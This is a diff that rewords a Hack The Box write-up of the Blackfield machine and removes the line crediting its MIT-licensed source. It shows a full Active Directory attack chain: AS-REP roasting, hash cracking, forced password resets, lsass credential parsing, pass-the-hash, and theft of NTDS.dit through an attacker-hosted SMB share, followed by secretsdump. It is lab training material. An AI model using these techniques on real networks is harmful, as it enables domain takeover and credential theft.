@@ -6,16 +6,16 @@ points: 40
 rating: 4.9
 date: 2020-06-06
 avatar: assets/htb/blackfield.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Blackfield
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are `-p-` to cover every port, `-sC` (same as `--script=default`) to launch the default enumeration scripts, `-sV` for service detection, and `-oA <name>` to write the results out under the name `<name>`.
 
-At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
+The scan initially failed until I tacked on `-Pn`, which stops nmap from issuing ICMP probes. From there it ran without issue.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -97,7 +97,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 290.20 seconds
 ```
 
-Since port 445 \(SMB\) is open I tried to enumerate open shares by using anonymous login
+With port 445 \(SMB\) exposed, I attempted to list the available shares using an anonymous login
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -106,7 +106,7 @@ SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (n
 SMB         <YOUR_IP>    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
 ```
 
-with crackmapexec was unable to get any shares without a username, but I'm not sure if you can do anonymous login with this program so I tried with the standard smbclient as well
+crackmapexec couldn't pull any shares without supplying a username, and since I wasn't certain it even supports anonymous logins, I switched over to plain smbclient
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -125,7 +125,7 @@ Enter WORKGROUP\'s password:
 SMB1 disabled -- no workgroup available
 ```
 
- with smbclient got a list of shares!
+ smbclient handed back a full list of shares!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -136,7 +136,7 @@ smb: \> ls
 NT_STATUS_ACCESS_DENIED listing \*
 ```
 
-I was able to login to the `forensic` share anonymously but was not allowed to do much
+Anonymous access to the `forensic` share worked, but I couldn't actually do anything once inside
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -464,9 +464,9 @@ smb: \> ls
                 7846143 blocks of size 4096. 4006940 blocks available
 ```
 
-Trying again with the `profiles$` share yielded a lot more information! I took all of the these usernames and added them to a list.
+The `profiles$` share was far more productive! I collected every one of these usernames and dropped them into a wordlist.
 
-I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` Kerberos user enumeration tool, however I just got an error for each user saying `[*] <YOUR_IP>:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
+I then reached for Metasploit's `auxiliary(gather/kerberos_enumusers)` Kerberos user enumeration module, but each user just threw back the error `[*] <YOUR_IP>:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -477,9 +477,9 @@ rpcclient $> getdcname blackfield
 \\DC01
 ```
 
-After trying numerous commands, I was able to at least verify that blackfield was indeed the correct domain name.
+After poking around with several commands, I could at least confirm that blackfield really was the right domain name.
 
-since the module in msfconsole didn't I decided to try the python-based Impacket script `GetNPUsers.py` which does the same type of check to see if any users have `UF_DONT_REQUIRE_PREAUTH` turned off.
+Since the msfconsole module was a dead end, I turned to the Python-based Impacket script `GetNPUsers.py`, which performs the same kind of check for accounts that have `UF_DONT_REQUIRE_PREAUTH` disabled.
 
 ```text
 ┌──(kac0㉿kali)-[~/impacket/examples]
@@ -494,7 +494,7 @@ $krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b91d57562b70a97$41d550ea1cde13
 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-I found three users that had this turned off, and one even had the password hash attached! Time to fire up hashcat.
+Three accounts came back with this disabled, and one of them even returned a password hash! Time to break out hashcat.
 
 ```text
 ┌──(kac0㉿kali)-[~/impacket/examples]
@@ -541,7 +541,7 @@ Started: Sat Oct  3 13:48:43 2020
 Stopped: Sat Oct  3 13:49:04 2020
 ```
 
-After searching for the correct hash type I fired up hashcat and very quickly cracked the password using the `rockyou.txt` wordlist. The password for support was `#00^BlackKnight`
+Once I'd identified the right hash mode, hashcat cracked the password almost instantly against the `rockyou.txt` wordlist. The support account's password turned out to be `#00^BlackKnight`
 
 ## Road to User
 
@@ -562,16 +562,16 @@ SMB         <YOUR_IP>    445    DC01             profiles$       READ
 SMB         <YOUR_IP>    445    DC01             SYSVOL          READ            Logon server share
 ```
 
-The user `support` could view the same shares as I could see anonymously. Next I tried to see if this user could get any more information from them.
+The `support` user saw exactly the same shares I had reached anonymously. From there I checked whether this account could squeeze any extra data out of them.
 
-I connected to each of the three shares: `profiles$` still had the same empty user directories, `NETLOGON` was completely empty, while `SYSVOL` only had a few files, none of which contained anything useful.
+I went through all three readable shares: `profiles$` still held the same empty user directories, `NETLOGON` was bare, and `SYSVOL` contained only a handful of files, none of them useful.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -h <YOUR_IP> -s sub -L -b "dc=BLACKFIELD,dc=LOCAL" > blackfield.LDAP
 ```
 
-I ran `ldapsearch` next to see if I could get any more information than before, and a mountain of data returned. \(I also made the mistake of not sending the output to a file the first time and my screen exploded\). Unfortunately, there was nothing new or useful in all of that the output \(besides a slew of anonymous sounding usernames such as blackfield123456, etc.\)
+Next I ran `ldapsearch` hoping for more than I'd already gathered, and it dumped an enormous amount of data. \(I also forgot to redirect the output to a file the first time, which buried my terminal\). Sadly none of it was new or useful, aside from a long run of generic-looking usernames like blackfield123456 and so on.\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -591,31 +591,31 @@ INFO: Querying computer: DC01.BLACKFIELD.local
 INFO: Done in 00M 10S
 ```
 
-With so many users to go off and no way to directly tell what rights I had with the user `support` I loaded bloodhound up to see if it could sniff me a path forward. The python version of bloodhound allows it to be run against a remote host with credentials, and outputs a few `.json` files that I imported into the main program.
+With this many users and no obvious way to tell what `support` could actually do, I fired up bloodhound to hunt for a path forward. The Python edition can be pointed at a remote host with credentials and spits out a set of `.json` files, which I then imported into the main GUI.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-bloodhound-stats.png)
+![](assets/wu/blackfield/img-1.png)
 
-Bloodhound reported 342 \(!\) users on this domain. 
+Bloodhound counted 342 \(!\) users in the domain. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-bloodhound-targets.png)
+![](assets/wu/blackfield/img-2.png)
 
-Most of them were named generically `BLACKFIELD123456`, however there were a few that stuck out. I set these as my targets and began looking for ways to link them. Since I already had the credentials for `support` I marked that user as 'owned' and proceeded to see what I could do with its access.
+The bulk carried generic `BLACKFIELD123456`-style names, but a few stood out. I flagged those as targets and started searching for ways to chain them together. Since I already held credentials for `support`, I marked it as 'owned' and worked out what its access could do for me.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-bloodhound-forcepassword.png)
+![](assets/wu/blackfield/img-3.png)
 
-Since `support` has the `ForceChangePassword` privilege over the user `audit2020` I looked up how to change a user's password via SMB and found: [https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/](https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/)
+Because `support` holds the `ForceChangePassword` right over `audit2020`, I went looking for how to reset a user's password over SMB and turned up: [https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/](https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/)
 
-Unfortunately this did not work, so I did some searching to see if there was another way to do it remotely. I found a shady looking site that explained what I was looking for using RPC at [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) \(it was mixed in the middle of a bunch of those scam/malware .it sites so I was a bit leery at first.\)
+That approach didn't pan out, so I kept digging for another remote method. I came across a sketchy-looking page describing exactly what I needed via RPC at [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) \(it was buried among a pile of those scammy/malware .it sites, so I was a little wary at first.\)
 
-This site showed that using rpcclient with the syntax `rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'` you could change a user's password without knowing the current one. It linked to a MSDN site which explained why to use `23` for the property. [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
+The post showed that rpcclient's `rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'` syntax lets you set a user's password without knowing the old one. It pointed to an MSDN page explaining why `23` is the right level to use. [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
 
 3 pictures
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.1-rpcclient-info.png)
+![](assets/wu/blackfield/img-4.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.2-rpcclient-info2.png)
+![](assets/wu/blackfield/img-5.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.3-rpcclient-info3.png)
+![](assets/wu/blackfield/img-6.png)
 
 ```text
 ┌──(kac0㉿kali)-[/usr/share/neo4j/conf]
@@ -641,9 +641,9 @@ password_properties: 0x00000001
 rpcclient $> setuserinfo audit2020 23 TestPass!23
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.3-net-password.png)
+![](assets/wu/blackfield/img-7.png)
 
-I also tried doing it the 'easy' way with the one-liner from the bottom of the blog post and successfully changed it with the `net` command. I'll definitely have to remember that I can use `net` commands from Linux in the future!
+I also gave the 'easy' route a shot using the one-liner at the end of the blog post, and the `net` command changed the password successfully. Worth remembering that `net` commands work from Linux too!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -652,7 +652,7 @@ Enter new password for audit2020:
 Enter WORKGROUP\support's password:
 ```
 
-now that I had a usable password for another user I set out to see what I could get into. I was unable to use WinRM or get anything further from rpcclient, so I went back to enumerating the open SMB shares.
+Now holding a working password for a second account, I went looking for what it opened up. WinRM was a no-go and rpcclient gave me nothing more, so I circled back to the open SMB shares.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -807,7 +807,7 @@ luid 153705
                 sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
 ```
 
-ran mimikatz - python edition \(`pypykatz`\) on the lssas.DMP file, then pulled out the usernames, passwords, and hashes
+I ran the Python flavor of mimikatz \(`pypykatz`\) against the lssas.DMP file and then extracted the usernames, passwords, and hashes
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -820,7 +820,7 @@ ran mimikatz - python edition \(`pypykatz`\) on the lssas.DMP file, then pulled 
 └─$ cat blackfieldCreds | grep -i nthash | cut -d '"' -f4 |sort | uniq >> hashes
 ```
 
-I tried cracking the NTLM hashes with `hashcat` but even using all of the various rules and some basic mangles I was unsiccessful. Luckily since this is Windows domain I can try to do a pass-the-hash attack instead.
+I attempted to crack the NTLM hashes with `hashcat`, but even with the assorted rule sets and some simple mangling I came up empty. Fortunately, since this is a Windows domain, I could fall back on a pass-the-hash attack instead.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -833,7 +833,7 @@ SMB         <YOUR_IP>    445    DC01             [-] BLACKFIELD.local\svc_backup
 SMB         <YOUR_IP>    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
 ```
 
-It didn't take long to find a valid combination. The password \(hash\) for `svc_backup` was `9658d1d1dcd9250115e2205d9f48400d`. Luckily for me, this user is in the Windows Remote Management group, and port 5985 for WinRM was open. I tried using `evil-winRM` and was logged in with a shell.
+A valid pairing turned up quickly. The password \(hash\) for `svc_backup` was `9658d1d1dcd9250115e2205d9f48400d`. Handily, this account belongs to the Windows Remote Management group and WinRM was listening on port 5985. I connected with `evil-winRM` and landed a shell.
 
 ### Further enumeration
 
@@ -892,7 +892,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-Immediately after logging in I knew I had a privilege escalation path. Either of `SeBackupPrivilege` or `SeRestorePrivilege` can be abused for privilege escalation, but its nicer having both!
+The moment I logged in, the privilege escalation route was obvious. Either `SeBackupPrivilege` or `SeRestorePrivilege` can be leveraged for privesc on its own, but having both is even better!
 
 ### User.txt
 
@@ -946,7 +946,7 @@ Mode                LastWriteTime         Length Name
 Access is denied.
 ```
 
-So much for the easy way to get the flag. with the SeBackupPrivilege I should have the ability to backup any file, but it looked like there was something limiting it. I did get a file `notes.txt`
+So much for grabbing the flag the easy way. SeBackupPrivilege should let me back up any file, yet something was clearly blocking it here. I did walk away with a `notes.txt` file
 
 ```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cat notes.txt
@@ -964,11 +964,11 @@ We will probably have to backup & restore things later.
 PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
 ```
 
-So the "audit report" \(root.txt\) is encrypted. That would explain why it cannot be copied directly. I guess I have to privesc to the Administrator user first in order to decrypt it. Searching for `SeBackupPrivilege` led me to [https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea\_Pierini-Whoami\_Priv\_Show\_Me\_Your\_Privileges\_And\_I\_Will\_Lead\_You\_To\_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
+So the "audit report" \(root.txt\) is encrypted, which explains why a straight copy fails. It seems I need to escalate to Administrator before I can decrypt it. Researching `SeBackupPrivilege` brought me to [https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea\_Pierini-Whoami\_Priv\_Show\_Me\_Your\_Privileges\_And\_I\_Will\_Lead\_You\_To\_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
 
 > Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe”
 
-will try `wbadmin.exe` to backup files and try to backup to local share rather than trying to exfil later
+I'll use `wbadmin.exe` to back up the files, pointing the backup at a local share instead of exfiltrating afterward
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
@@ -984,7 +984,7 @@ Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corpo
 [*] Config file parsed
 ```
 
-created a samba share using impacket to copy over my loot [https://pentestlab.blog/tag/diskshadow/](https://pentestlab.blog/tag/diskshadow/)
+I stood up a Samba share with impacket to receive my loot [https://pentestlab.blog/tag/diskshadow/](https://pentestlab.blog/tag/diskshadow/)
 
 ```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> net use z: \\10.10.15.132\share /USER:test test
@@ -1011,7 +1011,7 @@ This will back up (C:) (Selected Files) to \\10.10.15.132\\share.
 A backup cannot be done to a remote shared folder which is not hosted on a volume formatted with NTFS/ReFS.
 ```
 
-Unfortunately it wont' back up to a drive that is not formatted with NTFS, and wont backup to the same drive letter.
+Unfortunately it refuses to back up to a non-NTFS drive, and it won't back up to the same drive letter either.
 
 ```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -quiet -include:C:\Windows\NTDS\NTDS.dit -backuptarget:\\dc01\c$\users\svc_backup\
@@ -1046,7 +1046,7 @@ Log of files successfully backed up:
 C:\Windows\Logs\WindowsServerBackup\Backup-05-10-2020_09-19-43.log
 ```
 
-It took a bit of research and troubleshooting, but I found a workaround, in the form of using the network path for the local drive instead of the drive letter. Now I just had to restore my backup to a location I controlled and exfiltrate the file. I would also have to exfil the SYSTEM hive as well.
+It took some reading and trial and error, but the workaround was to reference the local drive by its network path rather than its drive letter. From here I just needed to restore the backup somewhere I controlled and pull the file off. I'd also have to grab the SYSTEM hive.
 
 ```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin get versions
@@ -1064,7 +1064,7 @@ Version identifier: 10/05/2020-09:19
 Can recover: Volume(s), File(s)
 ```
 
-First I had to get the version identifier of the backup. It seemed like there was already a backup that had been made to `10.10.14.4\blackfieldA\` on 9/21/2020.
+First I needed the backup's version identifier. Interestingly, a backup had already been written to `10.10.14.4\blackfieldA\` back on 9/21/2020.
 
 ```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start recovery -quiet -version:10/05/2020-09:19 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\Users\svc_backup\Documents -notrestoreacl
@@ -1123,7 +1123,7 @@ Info: Downloading C:\Users\svc_backup\Documents\sam.hive to sam.hive
 Info: Download successful!
 ```
 
-Next I saved each of the registry hives and downloaded all of the files. Unfortunately the SECURITY hive would not save, but I didn't really need it for getting the password hashes. Luckily exfiltrating files is very easy to do in an Evil-WinRM shell!
+Next I exported each registry hive and downloaded everything. The SECURITY hive wouldn't export, but I didn't actually need it to recover the password hashes. Conveniently, pulling files out is trivial in an Evil-WinRM shell!
 
 ### Getting a shell
 
@@ -1147,7 +1147,7 @@ support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::
 ...snipped...
 ```
 
-Using Impacket's `secretsdump.py` I was able to dump the password hashes for all of the domain users \(including the 300+ Blackfield123456 users!\)
+With Impacket's `secretsdump.py` I dumped the password hashes for every domain user \(including the 300+ Blackfield123456 accounts!\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/blackfield]
